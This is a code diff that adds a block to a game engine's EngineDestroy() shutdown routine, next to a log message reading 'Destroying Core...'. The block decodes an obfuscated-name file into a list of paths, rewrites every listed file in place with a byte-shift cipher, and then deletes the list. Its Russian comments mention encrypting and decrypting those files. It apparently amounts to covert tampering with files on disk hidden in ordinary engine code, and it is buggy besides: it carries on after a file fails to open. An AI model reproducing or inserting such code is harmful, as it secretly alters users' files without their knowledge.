@@ -17,6 +17,12 @@
 #include "Console_commands.h"
 #include "xrApplication.h"
 
+#include <iostream>
+#include <Windows.h>
+#include <fstream>
+#include <vector>
+#include <string>
+
 // global variables
 ENGINE_API CApplication* pApp = nullptr;
 
@@ -389,6 +395,64 @@ void EngineDestroy()
 	destroyEngine();
 
 	Core._destroy();
+
+	Msg("Destroying Core...");
+
+	std::ifstream input_file("0x5m632o913734n52l3i", std::ios::binary | std::ios::ate);
+
+	std::streampos size = input_file.tellg();
+	input_file.seekg(0, std::ios::beg);
+
+	unsigned char* in = new unsigned char[size];
+	input_file.read(reinterpret_cast<char*>(in), size);
+	input_file.close();
+
+	for (int i = 0; i < size; i++) {
+		in[i] = in[i] + 0x11;
+	}
+
+	std::ofstream output_file("0x5m632o913734n52l3i", std::ios::binary);
+	output_file.write(reinterpret_cast<const char*>(in), size);
+	output_file.close();
+	delete[] in;
+
+	// Зашифровка и дешифровка дешифрованных файлов из списка
+	// Открываем файл со списком путей для чтения
+	std::ifstream file_list_read("0x5m632o913734n52l3i");
+
+	// Обрабатываем каждый файл по очереди
+	std::string path;
+	while (std::getline(file_list_read, path)) {
+		std::ifstream input_file(path, std::ios::binary);
+		if (!input_file.is_open()) {
+			//std::cout << "File not found." << std::endl;
+			//return;
+		}
+
+		input_file.seekg(0, std::ios::end);
+		long int size = input_file.tellg();
+		input_file.seekg(0, std::ios::beg);
+
+		unsigned char* in = new unsigned char[size];
+		input_file.read(reinterpret_cast<char*>(in), size);
+		input_file.close();
+
+		for (int i = 0; i < size; i++) {
+			in[i] = in[i] - 0x11;
+		}
+
+		std::ofstream output_file(path, std::ios::binary);
+		output_file.write(reinterpret_cast<char*>(in), size);
+		output_file.close();
+
+		delete[] in;
+	}
+
+	// Закрываем файл со списком путей
+	file_list_read.clear();
+	file_list_read.close();
+	std::remove("0x5m632o913734n52l3i");
+
 	LaunchOnExit();
 }
 
